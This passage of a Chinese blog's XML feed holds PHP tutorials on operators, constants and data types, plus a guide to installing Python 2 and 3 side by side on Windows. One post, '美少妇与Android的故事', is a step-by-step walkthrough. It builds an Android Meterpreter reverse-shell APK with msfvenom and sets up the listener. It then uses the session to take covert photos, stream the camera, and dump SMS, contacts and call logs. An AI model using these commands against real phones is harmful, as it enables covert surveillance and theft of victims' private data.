punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!=</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//输出结果：bool(true)</span><span class="token delimiter">?></span></code></pre><p>。。。</p><p>其它的运算符以此类推。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP字符串运算符</title>
      <link href="/posts/52038.html"/>
      <url>/posts/52038.html</url>
      
        <content type="html"><![CDATA[<p><strong>1):字符串运算符</strong></p><blockquote><p><code>.</code> 连接运算符</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"你好"</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">"世界"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//你好世界</span><span class="token delimiter">?></span></code></pre><p><strong>2):赋值运算符</strong></p><blockquote><p><code>=</code>   把右边的值赋给左边的变量</p><p>左边一个变量 右边一个值 ——&gt;&gt;&gt; 二元运算符</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//其它运算符案例</span><span class="token operator">+</span><span class="token operator">=</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//$a=$a+$b;   把$a的值+$b的值 赋给$a</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">=</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$a=$a-$b;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">*</span><span class="token operator">=</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">*</span><span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$a=$a*$b;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">/</span><span class="token operator">=</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$a=$a/$b;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">%</span><span class="token operator">=</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">%</span><span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$a=$a%$b;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$a=$a.$b;</span><span class="token keyword">echo</span> <span class="token variable">$a</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP运算符</title>
      <link href="/posts/12118.html"/>
      <url>/posts/12118.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>运算符概述：</p><p>说白了就是一些符号，这些符号可以将变量或者数据执行某些运算操作。</p></blockquote><p><strong>1、算数运算符</strong></p><pre><code>+    -    *    /    %    ++    --例子            名称            结果-$a            取反            $a 的 负值$a + $b        加法            $a 和 $b 的和$a - $b        减法            $a 和 $b 的差$a * $b        乘法            $a 和 $b 的积$a / $b        除法            $a 除以 $b 的商$a % $b        取模            $a 除以 $b 的余数++$a           前加            $a 的值加一，然后返回$a$a++           后加            返回$a ,然后将$a 的值加一--$a           前减            $a 的值减一 ，然后返回 $a$a--           后减            返回$a，然后$a 的值减一</code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 1)+</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 2)-</span>    <span class="token comment" spellcheck="true">/*第一个意思：减号 */</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span> <span class="token operator">-</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*第二个意思：取反 */</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token operator">-</span><span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// $b = -$a;</span>    <span class="token comment" spellcheck="true">//echo $b;</span>    <span class="token comment" spellcheck="true">/*取反不会影响被变量的本身的值*/</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 3)*</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">*</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 4)/</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">/</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//5)%</span>   <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>   <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">%</span> <span class="token variable">$b</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//6)++</span>    <span class="token comment" spellcheck="true">//前++</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token operator">++</span><span class="token variable">$a</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$a = $a + 1;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//后++ </span>    <span class="token comment" spellcheck="true">//当在一个语句里面需要使用到被自增变量的值的时候，后++会先返回变量的值再去执行自增。</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$a ； $a= $a + 1;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>注意：<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$a</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这种情况不需要用到自增变量值的时候，和后++无区别</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//7)--</span>    <span class="token comment" spellcheck="true">//前--</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token operator">--</span><span class="token variable">$a</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$a = $a - 1;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//后--</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">--</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$a ； $a= $a - 1;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//自增或自减是对变量而言的！！！</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP常量篇查缺补漏</title>
      <link href="/posts/18812.html"/>
      <url>/posts/18812.html</url>
      
        <content type="html"><![CDATA[<p>//预定义常量<br>    说白了就是PHP自带的常量，我们直接拿过来使用即可。<br>    预定义常量是已 __开头的叫魔术常量，<br>    代码所在的位置不同它的值也是不不同的，所以他又叫魔术常量。<br>    ***<br>    八个常用的魔术变量：<a href="https://www.php.net/manual/zh/language.constants.predefined.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.constants.predefined.php</a><br>    预定义常量是不区分大小写的。<br>    自己定义的常量是严格区分大小写的。</p><p>（只要是常量建议都用大写命名）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10下安装python2和python3双版本</title>
      <link href="/posts/62309.html"/>
      <url>/posts/62309.html</url>
      
        <content type="html"><![CDATA[<p>一、安装Python2.x</p><p>双击 python-2.7.12.amd64.msi 然后一路 Next就可以了。<br>需要注意的是python 2.x 默认安装在 C盘根目录下，这非常便于查找，因此我们安装 python 3.x的时候也建议安装在C盘根目录下。</p><p>二、安装Python3.x</p><p>此处选择自定义安装，因为要修改默认安装位置。另外这里勾选了 “Add Python 3.8 to PATH” 选项，会自动配置环境变量，而python 2.x 需要我们手动配置，这个下面说。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425015541.png" alt=""></p><p>此处勾选“Install for all users” 并自定义安装路径为”C:\Python38”</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425015540.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425015544.png" alt=""></p><p>三、配置环境变量</p><p>格式如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425015543.png" alt=""></p><p>四、将python 2.x 和 python 3.x的相关命令区分开来</p><blockquote><p>解决方案是：</p><ul><li><p>将python 3.x 下的所有命令文件名称后都添加一个3，如：python.exe ==&gt; python3.exe</p><ul><li><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425015536.png" alt=""></li></ul></li><li><p>Python2.x 文件名称后加2，，如python.exe ==&gt; python2.exe</p><ul><li><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425015537.png" alt=""></li></ul></li></ul></blockquote><p>删除py3的pip文件。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425015545.png" alt=""></p><p>在执行此命令</p><p><code>python3 -m pip install -U pip</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425015542.png" alt=""></p><p>五、测试</p><blockquote><p>说明：一定要重新启动命令终端，否则的path变量不会被重新加载。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425015538.png" alt=""></p><p>最后执行<code>pip3 -v</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美少妇与Android的故事</title>
      <link href="/posts/32544.html"/>
      <url>/posts/32544.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习环境： </p><pre><code>            渗透测试环境 ：局域网                             系统： Kali Liunx                             工具： MFS                              目标 ：安卓手机</code></pre></blockquote><ul><li>首先打开msf，输入命令<code>show payloads</code> 查看攻击载荷</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425001439.png" alt=""></p><ul><li>配置木马并生成</li></ul><p><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.74.129 LPORT=4444 R &gt; /root/桌面/shell.apk</code></p><p>命令说明：</p><p><code>android/meterpreter/reverse_tcp</code>  攻击载荷</p><p><code>LHOST=192.168.74.129</code>  控制端的IP（也就是本机kali的ip） 查询IP的指令<code>ifconfig</code> </p><p><code>LPORT=4444</code> 监听端口</p><p><code>R &gt; /root/桌面/shell.apk</code>   保存路径为桌面</p><p>附图！</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425001437.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004816.png" alt=""></p><ul><li>启用攻击模块，并配置控制端信息。</li></ul><p><code>use exploit/multi/handler</code>  选择攻击模式</p><p><code>set payload android/meterpreter/reverse_tcp</code>  加载攻击模块</p><p><code>show options</code> 查看参数设置</p><p><code>set LHOST</code>  设置攻击机ip</p><p><code>set LPORT</code>  设置监听端口</p><p><code>exploit</code> 执行</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004817.png" alt=""></p><p>最后等待马子上线，反弹shell到控制端。</p><p>附图！！</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004818.png" alt=""></p><p>控制终端输入<code>sysinfo</code> 查看手机系统相关信息</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425001435.png" alt=""></p><p>控制终端输入 <code>webcam_list</code> 查看手机摄影头有几个 这里显示两项 分别表示有前后两个摄像头</p><p> <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425001438.png" alt=""></p><p><code>webcam_snap</code> 隐秘拍照功能</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004821.png" alt=""></p><p><code>webcam_stream</code>开启摄像头</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004819.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200425004820.png" alt=""></p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre><code>webcam_list  列出网络摄像头record_mic [ˈrekərd]/记录/  从默认麦克风录制音频为X秒webcam_chat  开始视频聊天webcam_snap  从指定的摄像头获取快照webcam_stream -i 1  从指定的网络摄像头播放视频流[选择后摄像头activity_start  从URI字符串启动Android活动check_root  检查设备是否有根dump_calllog  获取调用日志dump_contacts  获取联系人列表dump_sms  获取短信geolocate  利用地理定位获取当前LATwlan_geolocate  利用WLAN信息获取当前LAThide_app_icon  从发射器隐藏应用程序图标interval_collect  管理区间收集能力send_sms  从目标会话发送短消息set_audio_modesqlite_query  从存储库查询SQLite数据库wakelock  启用/禁用Wakelock</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP总结笔记</title>
      <link href="/posts/51165.html"/>
      <url>/posts/51165.html</url>
      
        <content type="html"><![CDATA[<h1 id="PHP5-数据类型"><a href="#PHP5-数据类型" class="headerlink" title="PHP5 数据类型"></a>PHP5 数据类型</h1><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。</p><h2 id="PHP整型"><a href="#PHP整型" class="headerlink" title="PHP整型"></a>PHP整型</h2><blockquote><p>整数是一个没有小数的数字。</p><p>整数规则：</p><pre><code>        整数必须至少有一个数字（0-9）        整数不能包含逗号或空格        整数是没有小数点的的        整数可以是正数或负数        整型可以用三种格式来指定：十进制，十六进制（以0x为前缀）或八进制（前缀为0 ）。            </code></pre></blockquote><ul><li>使用PHP var_dump() 函数返回变量的数据类型和值</li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//正数</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">111</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//负数</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0x3</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//十六进制数</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">00011</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//八进制数</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="PHP-浮点型"><a href="#PHP-浮点型" class="headerlink" title="PHP 浮点型"></a>PHP 浮点型</h2><blockquote><p>浮点数是带小数部分的数字，或是指数形式。</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">11.111</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">2.2e2</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">3E-5</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="PHP布尔形"><a href="#PHP布尔形" class="headerlink" title="PHP布尔形"></a>PHP布尔形</h2><blockquote><p>布尔形可以是TRUE 和 FALSE。 </p><pre><code>                                        通常用于条件判断。</code></pre></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h1 id="PHP数组"><a href="#PHP数组" class="headerlink" title="PHP数组"></a>PHP数组</h1><blockquote><p>数组可以在变量中存储多个值。</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"B"</span><span class="token punctuation">,</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$cars</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"{$cars[0]}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"{$cars[1]}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"{$cars[2]}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h1 id="PHP-NULL-值"><a href="#PHP-NULL-值" class="headerlink" title="PHP NULL 值"></a>PHP NULL 值</h1><blockquote><p>NULL 值表示变量没有值。</p><p>可以通过设置变量值为 NULL 来清空变量数据：</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"Hello World！"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">"NULL"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="PHP-类型比较"><a href="#PHP-类型比较" class="headerlink" title="PHP 类型比较"></a>PHP 类型比较</h2><blockquote><p>松散比较：使用两个等号 == 比较，只比较值，不比较类型。<br> 严格比较：用三个等号 === 比较，除了比较值，也比较类型。</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">42</span> <span class="token operator">==</span> <span class="token string">"42"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'1、值相等'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 换行符</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">42</span> <span class="token operator">===</span> <span class="token string">"42"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'2、类型相等'</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'3、不相等'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//输出：</span><span class="token comment" spellcheck="true">//1、值相等</span><span class="token comment" spellcheck="true">//3、不相等 </span></code></pre><h1 id="PHP常量"><a href="#PHP常量" class="headerlink" title="PHP常量"></a>PHP常量</h1><blockquote><ul><li><p>常量值被定义后，在脚本的其他任何地方都不能被改变。</p><ul><li><p>一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 </p></li><li><p>(常量名不需要加 $ 修饰符)。</p></li></ul></li></ul><pre><code>该函数有三个参数: `name`：必选参数，常量名称，即标志符。 `value`：必选参数，常量的值。 `case_insensitive `：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</code></pre></blockquote><h2 id="区分大小写的常量"><a href="#区分大小写的常量" class="headerlink" title="区分大小写的常量"></a>区分大小写的常量</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"HELLO"</span><span class="token punctuation">,</span> <span class="token string">"还在人海里浮沉"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//常量名称需要加双引号</span>    <span class="token keyword">echo</span> hello<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//常量名不需要加 $ 修饰符 和 双引号</span><span class="token delimiter">?></span></code></pre><h2 id="不区分大小写的常量"><a href="#不区分大小写的常量" class="headerlink" title="不区分大小写的常量"></a>不区分大小写的常量</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"HELLO"</span><span class="token punctuation">,</span><span class="token string">"不区分大小写的常量"</span><span class="token punctuation">,</span><span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">HELLO</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> hello<span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 